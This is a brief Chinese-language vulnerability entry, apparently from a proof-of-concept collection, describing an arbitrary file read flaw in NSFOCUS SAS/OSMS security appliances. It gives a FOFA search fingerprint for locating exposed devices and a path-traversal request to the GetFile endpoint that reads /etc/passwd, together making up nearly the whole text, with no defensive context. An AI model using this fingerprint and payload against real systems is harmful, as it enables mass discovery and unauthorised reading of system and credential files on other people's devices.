# 绿盟 SAS&OSMS GetFile 任意文件读取漏洞

## 网络测绘

fofa: body="'/needUsbkey.php?username='"

## POC / EXP

```
/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
```